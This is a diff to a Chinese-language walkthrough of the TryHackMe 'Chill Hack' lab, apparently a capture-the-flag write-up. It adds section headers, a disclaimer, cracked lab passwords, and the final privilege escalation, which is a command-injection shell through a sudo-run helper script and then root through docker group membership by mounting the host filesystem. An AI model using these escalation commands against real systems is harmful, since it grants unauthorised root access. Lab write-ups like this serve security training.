@@ -1,3 +1,6 @@
+# 免责声明
+>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。
+
 # 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/chillhack]
@@ -199,6 +202,8 @@ ls -alh /home/apaar/.helpline.sh
 此文件对于本账户不可写，因此不可以直接把shell写进bash
 但是留意代码内容，它分别接受两个参数，第一个```person```没有什么作用，第二个```msg```，我们可以看见是作为一个命令直接执行了，因此我们可以加以利用
 
+
+# 横向提权到apaar
 我们把msg命令赋值为：```/bin/bash```，拿到apaar的shell
 ```
 www-data@ubuntu:/var/www/html/secret$ sudo -u apaar  /home/apaar/.helpline.sh 
@@ -219,6 +224,8 @@ apaar
 ```
 
 在apaar的home目录拿到user flag
+
+# 横向提权到Anurodh
 
 我们在```/var/www/files/index.php```找到数据库登录信息
 ```
@@ -293,8 +300,8 @@ select * from users;
 ```
 
 两个md5解密出来分别是：
-Anurodh ：masterpassword
-Apaar ：dontaskdonttell
+>Anurodh ：masterpassword
+>Apaar ：dontaskdonttell
 
 
 然而这两个并不是ssh密码。。。
@@ -365,7 +372,24 @@ Session completed
 ?>
 ```
 
-从代码可知，这是验证anurodh的登录文件，密码被base64加密，解密出来后是：```!d0ntKn0wmYp@ssw0rd```
+从代码可知，这是验证anurodh的登录文件，密码被base64加密
 
 这个凭证可以登录anurodh的ssh
+
+登录进去以后传linpeas，发现当前用户在docker用户组，可以利用组权限提权
+```
+anurodh@ubuntu:/tmp$ id
+uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+```
+
+# 提权到root
+```
+anurodh@ubuntu:/tmp$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+# cd /root
+# ls
+proof.txt
+```
+
 
